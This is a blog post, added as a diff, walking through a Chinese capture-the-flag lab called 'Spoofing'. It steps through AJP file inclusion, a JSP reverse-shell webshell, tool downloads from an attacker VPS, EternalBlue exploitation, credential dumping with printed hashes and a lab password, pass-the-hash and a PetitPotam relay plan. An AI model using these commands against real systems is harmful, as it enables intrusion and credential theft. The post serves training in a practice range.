@@ -1,0 +1,1483 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/gkjzjh146.github.io\/",
+  "author": {
+    "@type": "Person",
+    "name": "gkjzjh146",
+    
+    "image": "https://gkjzjh146.github.io/images/1.jpg"
+    
+  },
+  "name":"gkjzjh146",
+  "description":"",
+  "url":"https:\/\/gkjzjh146.github.io\/post\/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing\/",
+  "keywords":"[春秋云境, Spoofing]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.115.4 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="gkjzjh146">
+<meta name="keywords" content="春秋云境, Spoofing">
+<meta name="description" content="">
+
+
+<meta property="og:description" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境-Spoofing">
+<meta name="twitter:title" content="春秋云境-Spoofing">
+<meta property="og:url" content="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing/">
+<meta property="twitter:url" content="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing/">
+<meta property="og:site_name" content="gkjzjh146">
+<meta property="og:description" content="">
+<meta name="twitter:description" content="">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2023-10-05T12:02:39">
+  
+  
+    <meta property="article:modified_time" content="2023-10-05T12:02:39">
+  
+  
+  
+    
+      <meta property="article:section" content="渗透">
+    
+  
+  
+    
+      <meta property="article:tag" content="春秋云境">
+    
+      <meta property="article:tag" content="wp">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/images/1.jpg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/images/1.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/8.jpeg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/8.jpeg">
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/Spoofing.png">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/Spoofing.png">
+
+
+    <title>春秋云境-Spoofing</title>
+
+    <link rel="icon" href="https://gkjzjh146.github.io/images/1.jpg">
+    
+
+    
+
+    <link rel="canonical" href="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing/">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://gkjzjh146.github.io/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://gkjzjh146.github.io/" aria-label="去首页">gkjzjh146</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://gkjzjh146.github.io/#about" aria-label="打开链接: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://gkjzjh146.github.io/#about" aria-label="阅读有关作者的更多信息">
+          <img class="sidebar-profile-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">gkjzjh146</h4>
+        
+          <h5 class="sidebar-profile-bio">会点web，会点misc</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">分类</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/#about" title="About">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              "
+       style="background-image:url('/8.jpeg')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title">
+      春秋云境-Spoofing
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2023-10-05T12:02:39&#43;08:00">
+        
+  十月 5, 2023
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/%e6%b8%97%e9%80%8f">渗透</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <h1 id="table-of-contents">目录</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#flag1">flag1</a></li>
+    <li><a href="#flag2">flag2</a></li>
+    <li><a href="#flag3">flag3</a></li>
+    <li><a href="#flag4">flag4</a></li>
+  </ul>
+</nav>
+
+<h1 id="flag1">flag1</h1>
+<pre tabindex="0"><code>fscan64 -h 39.98.109.172
+</code></pre><pre tabindex="0"><code>
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.2
+start infoscan
+(icmp) Target 39.98.109.172   is alive
+[*] Icmp alive hosts len is: 1
+39.98.109.172:8080 open
+39.98.109.172:22 open
+39.98.109.172:8009 open
+[*] alive ports len is: 3
+start vulscan
+[*] WebTitle: http://39.98.109.172:8080 code:200 len:7091   title:后台管理
+已完成 3/3
+[*] 扫描结束,耗时: 38.7250974s
+</code></pre><p>8080有网站</p>
+<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231004235458639.png" alt="image-20231004235458639"></p>
+<pre tabindex="0"><code>dirsearch -u &#34;http://39.98.109.172:8080/&#34;
+</code></pre><pre tabindex="0"><code>└─# dirsearch -u &#34;http://39.98.109.172:8080/&#34;
+
+  _|. _ _  _  _  _ _|_    v0.4.2                                                                               
+ (_||| _) (/_(_|| (_| )                                                                                        
+                                                                                                               
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
+
+Output File: /root/.dirsearch/reports/39.98.109.172-8080/-_23-10-04_11-54-21.txt
+
+Error Log: /root/.dirsearch/logs/errors-23-10-04_11-54-21.log
+
+Target: http://39.98.109.172:8080/
+
+[11:54:22] Starting: 
+[11:54:22] 302 -    0B  - /js  -&gt;  /js/                                    
+[11:54:25] 200 -  114B  - /404.html                                         
+[11:54:27] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
+[11:54:27] 400 -  795B  - /a%5c.aspx                                        
+[11:54:35] 302 -    0B  - /css  -&gt;  /css/                                   
+[11:54:35] 302 -    0B  - /data  -&gt;  /data/                                 
+[11:54:36] 302 -    0B  - /docs  -&gt;  /docs/                                 
+[11:54:36] 200 -   17KB - /docs/                                            
+[11:54:36] 200 -  132B  - /download/                                        
+[11:54:36] 302 -    0B  - /download  -&gt;  /download/                         
+[11:54:37] 302 -    0B  - /examples  -&gt;  /examples/                         
+[11:54:37] 200 -  947B  - /examples/servlets/servlet/RequestHeaderExample   
+[11:54:37] 200 -    1KB - /examples/
+[11:54:37] 200 -  658B  - /examples/servlets/servlet/CookieExample          
+[11:54:37] 200 -    6KB - /examples/servlets/index.html
+[11:54:37] 200 -  680B  - /examples/jsp/snp/snoop.jsp                       
+[11:54:38] 403 -    3KB - /host-manager/html                                
+[11:54:38] 403 -    3KB - /host-manager/                                    
+[11:54:38] 302 -    0B  - /images  -&gt;  /images/                             
+[11:54:39] 200 -    7KB - /index.html                                       
+[11:54:40] 302 -    0B  - /lib  -&gt;  /lib/                                   
+[11:54:41] 302 -    0B  - /manager  -&gt;  /manager/                           
+[11:54:41] 403 -    3KB - /manager/                                         
+[11:54:41] 403 -    3KB - /manager/admin.asp
+[11:54:41] 403 -    3KB - /manager/login
+[11:54:41] 403 -    3KB - /manager/html
+[11:54:41] 403 -    3KB - /manager/VERSION
+[11:54:41] 403 -    3KB - /manager/login.asp
+[11:54:41] 403 -    3KB - /manager/html/
+[11:54:41] 403 -    3KB - /manager/status/all
+[11:54:41] 403 -    3KB - /manager/jmxproxy
+[11:54:41] 403 -    3KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&amp;op=findConnectors&amp;ps=
+[11:54:41] 403 -    3KB - /manager/jmxproxy/?set=BEANNAME&amp;att=MYATTRIBUTE&amp;val=NEWVALUE
+[11:54:41] 403 -    3KB - /manager/jmxproxy/?set=Catalina%3Atype%3DValve%2Cname%3DErrorReportValve%2Chost%3Dlocalhost&amp;att=debug&amp;val=cow                                                                                       
+[11:54:41] 403 -    3KB - /manager/jmxproxy/?get=BEANNAME&amp;att=MYATTRIBUTE&amp;key=MYKEY
+[11:54:41] 403 -    3KB - /manager/jmxproxy/?invoke=BEANNAME&amp;op=METHODNAME&amp;ps=COMMASEPARATEDPARAMETERS
+[11:54:41] 403 -    3KB - /manager/jmxproxy/?qry=STUFF                      
+[11:54:41] 403 -    3KB - /manager/jmxproxy/?get=java.lang:type=Memory&amp;att=HeapMemoryUsage&amp;key=used
+[11:54:41] 403 -    3KB - /manager/jmxproxy/?get=java.lang:type=Memory&amp;att=HeapMemoryUsage
+[11:54:49] 403 -    0B  - /upload                                           
+[11:54:50] 403 -    0B  - /upload/                                          
+[11:54:50] 403 -    0B  - /upload/upload.php
+[11:54:50] 403 -    0B  - /upload/b_user.xls                                
+[11:54:50] 403 -    0B  - /upload/test.php
+[11:54:50] 403 -    0B  - /upload/1.php
+[11:54:50] 403 -    0B  - /upload/loginIxje.php
+[11:54:50] 403 -    0B  - /upload/b_user.csv
+[11:54:50] 403 -    0B  - /upload/2.php                                     
+[11:54:50] 403 -    0B  - /upload/test.txt
+[11:54:50] 200 -    9KB - /user.html                                        
+                                                                             
+Task Completed
+</code></pre><p>查看</p>
+<pre tabindex="0"><code>/docs/
+</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231004235628348.png" alt="image-20231004235628348"></p>
+<p>发现是 <code>Apache Tomcat Version 9.0.30, Dec 7 2019</code>, 可以 CVE-2020-1938 AJP 文件包含</p>
+<pre tabindex="0"><code>python3 ajpShooter.py http://39.98.109.172:8080 8009  /WEB-INF/web.xml read
+</code></pre><pre tabindex="0"><code>└─# python3 ajpShooter.py http://39.98.109.172:8080 8009  /WEB-INF/web.xml read
+
+       _    _         __ _                 _            
+      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
+     //_\\ | | &#39;_ \  \ \| &#39;_ \ / _ \ / _ \| __/ _ \ &#39;__|
+    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
+    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
+         |__/|_|                                        
+                                                00theway,just for test
+    
+
+[&lt;] 200 200
+[&lt;] Accept-Ranges: bytes
+[&lt;] ETag: W/&#34;2489-1670857638305&#34;
+[&lt;] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT
+[&lt;] Content-Type: application/xml
+[&lt;] Content-Length: 2489
+
+&lt;!DOCTYPE web-app PUBLIC
+ &#34;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&#34;
+ &#34;http://java.sun.com/dtd/web-app_2_3.dtd&#34; &gt;
+
+&lt;web-app&gt;
+  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;
+
+  &lt;security-constraint&gt;
+    &lt;display-name&gt;Tomcat Server Configuration Security Constraint&lt;/display-name&gt;
+    &lt;web-resource-collection&gt;
+      &lt;web-resource-name&gt;Protected Area&lt;/web-resource-name&gt;
+      &lt;url-pattern&gt;/upload/*&lt;/url-pattern&gt;
+    &lt;/web-resource-collection&gt;
+    &lt;auth-constraint&gt;
+      &lt;role-name&gt;admin&lt;/role-name&gt;
+    &lt;/auth-constraint&gt;
+  &lt;/security-constraint&gt;
+
+  &lt;error-page&gt;
+    &lt;error-code&gt;404&lt;/error-code&gt;
+    &lt;location&gt;/404.html&lt;/location&gt;
+  &lt;/error-page&gt;
+
+  &lt;error-page&gt;
+    &lt;error-code&gt;403&lt;/error-code&gt;
+    &lt;location&gt;/error.html&lt;/location&gt;
+  &lt;/error-page&gt;
+
+  &lt;error-page&gt;
+    &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;
+    &lt;location&gt;/error.html&lt;/location&gt;
+  &lt;/error-page&gt;
+
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/HelloServlet&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+
+  &lt;servlet&gt;
+    &lt;display-name&gt;LoginServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.example.LoginServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/LoginServlet&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+
+  &lt;servlet&gt;
+    &lt;display-name&gt;RegisterServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.example.RegisterServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/RegisterServlet&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+
+  &lt;servlet&gt;
+    &lt;display-name&gt;UploadTestServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.example.UploadTestServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+
+  &lt;servlet&gt;
+    &lt;display-name&gt;DownloadFileServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.example.DownloadFileServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+&lt;/web-app&gt;
+</code></pre><p>看<code>/UploadServlet</code></p>
+<p>可以结合文件包含实现rce</p>
+<p>shell.txt</p>
+<pre tabindex="0"><code>&lt;%
+    java.io.InputStream in = Runtime.getRuntime().exec(&#34;bash -c {echo,YmFzaCAta..LjUzLzU0IDA+JjE=}|{base64,-d}|{bash,-i}&#34;).getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    out.print(&#34;&lt;pre&gt;&#34;);
+    while((a=in.read(b))!=-1){
+        out.println(new String(b));
+    }
+    out.print(&#34;&lt;/pre&gt;&#34;);
+%&gt;
+</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005000243292.png" alt="image-20231005000243292"></p>
+<pre tabindex="0"><code>/upload/555ece2d9133831410333f71cc95650d/20231005120227126.txt
+</code></pre><p>文件包含</p>
+<pre tabindex="0"><code>python3 ajpShooter.py http://39.98.109.172:8080/   8009 /upload/555ece2d9133831410333f71cc95650d/20231005120227126.txt   eval
+</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005000427449.png" alt="image-20231005000427449"></p>
+<h1 id="flag2">flag2</h1>
+<p>可以参考这个留个后门</p>
+<p><a href="https://blog.csdn.net/weixin_40412037/article/details/118305343">LINUX留后门&ndash;教程（四）—— ssh 公钥免密_W小哥1的博客-CSDN博客</a></p>
+<pre tabindex="0"><code>wget http://vps:port/fscan
+wget http://vps:port/frpc
+wget http://vps:port/frpc.ini
+</code></pre><pre tabindex="0"><code>ifconfig
+</code></pre><pre tabindex="0"><code>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.22.11.76  netmask 255.255.0.0  broadcast 172.22.255.255
+        inet6 fe80::216:3eff:fe13:30ce  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:16:3e:13:30:ce  txqueuelen 1000  (Ethernet)
+        RX packets 139500  bytes 157280550 (157.2 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 51491  bytes 11575252 (11.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 684  bytes 58721 (58.7 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 684  bytes 58721 (58.7 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre><pre tabindex="0"><code>./fscan -h 172.22.11.76/24
+</code></pre><pre tabindex="0"><code>
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.2
+start infoscan
+(icmp) Target 172.22.11.6     is alive
+(icmp) Target 172.22.11.26    is alive
+(icmp) Target 172.22.11.76    is alive
+(icmp) Target 172.22.11.45    is alive
+[*] Icmp alive hosts len is: 4
+172.22.11.76:22 open
+172.22.11.76:8080 open
+172.22.11.26:445 open
+172.22.11.45:445 open
+172.22.11.6:445 open
+172.22.11.45:139 open
+172.22.11.6:139 open
+172.22.11.26:139 open
+172.22.11.45:135 open
+172.22.11.26:135 open
+172.22.11.6:135 open
+172.22.11.6:88 open
+172.22.11.76:8009 open
+[*] alive ports len is: 13
+start vulscan
+[*] NetInfo:
+[*]172.22.11.6
+   [-&gt;]XIAORANG-DC
+   [-&gt;]172.22.11.6
+[*] NetBios: 172.22.11.26    XIAORANG\XR-LCM3AE8B           
+[+] 172.22.11.45        MS17-010        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
+[*] NetBios: 172.22.11.6     [+]DC XIAORANG\XIAORANG-DC     
+[*] NetInfo:
+[*]172.22.11.26
+   [-&gt;]XR-LCM3AE8B
+   [-&gt;]172.22.11.26
+[*] NetBios: 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1 
+[*] WebTitle: http://172.22.11.76:8080  code:200 len:7091   title:后台管理
+已完成 13/13
+[*] 扫描结束,耗时: 8.436978072s
+</code></pre><p>整理一下</p>
+<pre tabindex="0"><code>172.22.11.6 XIAORANG-DC DC
+172.22.11.26 XR-LCM3AE8B
+172.22.11.76 本机
+172.22.11.45 MS17-010 XR-DESKTOP
+</code></pre><p>下一步打172.22.11.45，永恒之蓝，直接用msf打就可以了</p>
+<p>挂个代理</p>
+<pre tabindex="0"><code>chmod +x frpc
+./frpc -c frpc.ini
+</code></pre><pre tabindex="0"><code>proxychains msfconsole
+</code></pre><pre tabindex="0"><code>use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/bind_tcp
+set RHOSTS 172.22.11.45
+exploit
+</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005001435520.png" alt="image-20231005001435520"></p>
+<p>拿到shell，拿到flag2</p>
+<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005001530779.png" alt="image-20231005001530779"></p>
+<h1 id="flag3">flag3</h1>
+<p>抓取hash</p>
+<pre tabindex="0"><code>meterpreter &gt;load kiwi
+meterpreter &gt; hashdump
+</code></pre><pre tabindex="0"><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:48f6da83eb89a4da8a1cc963b855a799:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</code></pre><pre tabindex="0"><code>meterpreter &gt; creds_all
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username     Domain    NTLM                              SHA1
+--------     ------    ----                              ----
+XR-DESKTOP$  XIAORANG  578bcc26fbbadeea510280fbfd3859e9  8d91913663e19059d5cfa1e2b2958fd97a407c78
+yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f
+
+wdigest credentials
+===================
+
+Username     Domain    Password
+--------     ------    --------
+(null)       (null)    (null)
+XR-DESKTOP$  XIAORANG  06 22 fe e0 24 5c 76 04 f3 2c 02 93 08 26 cd 3d 0d 36 b7 75 cf 23 18 a9 3c 0c 02 96 e1
+                        52 5f 2a 4e 88 aa d4 ec 21 6e a2 8b 33 3b a8 cf f4 8e bf 2c 75 d0 b9 b9 92 53 65 b2 6
+                       c 6f bf 18 06 59 4e c9 7f ff 5a 0f f4 b5 d9 60 eb 3b 63 ed ae dc 45 44 cd 4e e8 44 9b
+                       6c 39 ce 2f 6e 12 c8 f7 a3 09 0c 2f a8 89 4a a0 92 29 33 27 0c f8 6c 3a 93 5e 6f 77 95
+                        67 e4 36 1a ba 32 df 1a 07 28 39 ca 62 30 66 63 aa e8 57 c0 6b 7f d5 b8 26 a5 da 52 0
+                       b 12 2e 6e c0 d0 3b 5c 94 30 d5 a4 c9 7b 24 50 41 02 22 e7 20 cf b4 bd 33 54 20 85 53
+                       4d 30 58 76 3d fd e1 87 07 7f 51 9d cb 9f 94 7f 53 3e 9d 97 1a 85 47 51 0c e0 50 6b d3
+                        48 2b e5 b6 9f fe ac 6a 00 da 1d 40 25 f4 96 96 bf a2 b0 aa ac 50 55 ca a5 3b d8 9c c
+                       a 39 26 c5 dd 96 d9 da 85 e3 08
+yangmei      XIAORANG  xrihGHgoNZQ
+
+kerberos credentials
+====================
+
+Username     Domain        Password
+--------     ------        --------
+(null)       (null)        (null)
+xr-desktop$  XIAORANG.LAB  06 22 fe e0 24 5c 76 04 f3 2c 02 93 08 26 cd 3d 0d 36 b7 75 cf 23 18 a9 3c 0c 02 9
+                           6 e1 52 5f 2a 4e 88 aa d4 ec 21 6e a2 8b 33 3b a8 cf f4 8e bf 2c 75 d0 b9 b9 92 53
+                            65 b2 6c 6f bf 18 06 59 4e c9 7f ff 5a 0f f4 b5 d9 60 eb 3b 63 ed ae dc 45 44 cd
+                           4e e8 44 9b 6c 39 ce 2f 6e 12 c8 f7 a3 09 0c 2f a8 89 4a a0 92 29 33 27 0c f8 6c 3
+                           a 93 5e 6f 77 95 67 e4 36 1a ba 32 df 1a 07 28 39 ca 62 30 66 63 aa e8 57 c0 6b 7f
+                            d5 b8 26 a5 da 52 0b 12 2e 6e c0 d0 3b 5c 94 30 d5 a4 c9 7b 24 50 41 02 22 e7 20
+                           cf b4 bd 33 54 20 85 53 4d 30 58 76 3d fd e1 87 07 7f 51 9d cb 9f 94 7f 53 3e 9d 9
+                           7 1a 85 47 51 0c e0 50 6b d3 48 2b e5 b6 9f fe ac 6a 00 da 1d 40 25 f4 96 96 bf a2
+                            b0 aa ac 50 55 ca a5 3b d8 9c ca 39 26 c5 dd 96 d9 da 85 e3 08
+xr-desktop$  XIAORANG.LAB  (null)
+yangmei      XIAORANG.LAB  xrihGHgoNZQ
+</code></pre><p>wmiexec上去</p>
+<pre tabindex="0"><code>proxychains impacket-wmiexec -hashes 00000000000000000000000000000000:48f6da83eb89a4da8a1cc963b855a799 Administrator@172.22.11.45
+</code></pre><p>给yangmei添加到管理员里面</p>
+<pre tabindex="0"><code>net localgroup administrators yangmei /add
+</code></pre><p>使用bloodhound收集</p>
+<pre tabindex="0"><code>python bloodhound.py -u yangmei -p xrihGHgoNZQ -d xiaorang.lab --dns-tcp -ns 172.22.11.6 -c all --zip
+</code></pre><p><a href="https://www.cnblogs.com/backlion/p/17187375.html">春秋云镜-【仿真场景】Spoofing writeup - 渗透测试中心 - 博客园 (cnblogs.com)</a></p>
+<p>看大佬wp打了。。</p>
+<ol>
+<li>使用Bloodhound收集到的用户名组合获取到的密码/hashes组合爆破，没发现其他新用户</li>
+<li>MAQ = 0，加不了计算机</li>
+<li>当前LDAP 没 TLS，远程也加不了计算机，impacket的addcomputer有两种方法samr和ldaps。samr受到MAQ = 0的限制，无法添加计算机；ldaps受到 没TLS + MAQ = 0 的限制</li>
+<li>域控存在nopac，当前用户yangmei使用nopac没打死，并且对域内computer container没有createchild的ACL</li>
+<li>域控存在nopac，当前用户yangmei对当前windows机器xr-desktop没WriteDacl权限，意味着无法修改SamAccountName</li>
+<li>域内存在 DFscoerce 和 petitpotam，但是不存在CVE-2019-1040，因此放弃 DFscoerce，优先使用petitpotam</li>
+<li>NoPac exploit: <a href="https://github.com/Ridter/noPac">Ridter/noPac: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user (github.com)</a></li>
+</ol>
+<p>petitpotam扫描</p>
+<pre tabindex="0"><code>proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam
+</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005003206141.png" alt="image-20231005003206141"></p>
+<p>无ADCS + Petitpotam + ntlm中继打法</p>
+<p>攻击链：用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，允许我们的恶意机器账户模拟以及认证访问到目标机器 (RBCD)</p>
+<p>满足条件，目标机器需要开启webclient服务</p>
+<p>WebClient扫描，确定只能拿下 172.22.11.26 (XR-LCM3AE8B)</p>
